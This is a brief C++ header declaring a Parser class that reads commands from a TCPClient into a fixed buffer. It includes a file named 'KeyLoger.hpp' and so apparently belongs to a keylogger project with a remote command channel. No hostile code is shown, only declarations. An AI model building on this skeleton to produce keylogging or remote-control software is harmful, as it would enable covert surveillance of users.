#ifndef PARSER_HPP_
#define PARSER_HPP_

#include "Protocol.hpp"
#include "KeyLoger.hpp"

class TCPClient;

class Parser
{
public:
	Parser(TCPClient &);
	~Parser();
	void parseCommands();
private:
	TCPClient &m_client;
	char m_buffer[sizeof(t_cmd)];
};

#endif /* !PARSER_HPP_ */